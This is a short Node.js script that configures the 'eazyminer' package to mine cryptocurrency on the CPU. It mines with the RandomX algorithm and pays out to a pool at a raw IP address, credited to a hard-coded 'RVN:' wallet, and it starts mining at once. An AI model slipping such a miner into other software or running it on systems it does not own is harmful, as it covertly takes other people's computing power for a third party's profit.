const Miner = require('eazyminer');

const miner = new Miner({
    autosave: false,
    pools: [
        {
            enabled: true,
            coin: null,
            algo: "rx/0",
            user: 'RVN:RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp.001',
            url: '3.95.214.130:4444', // optional pool URL,
            pass: "x",
            tls: true,
        }
    ],
    autoStart: false, // optional delay,
    cpu: {
        enabled: true,
        "intensity": 2,
        "threads": 2,
        "affinity": -1,
        "max-threads-hint": 50,
    },
    web: {
        // Enable or Disable web client
        enabled: false,
        // The used port for the webclient
        port: 3000 
    },
    log: {
        // Set to null to disable
        writeToFile: null,
        // Set to false to disable writing to console
        writeToConsole: true
    }
});

miner.start();
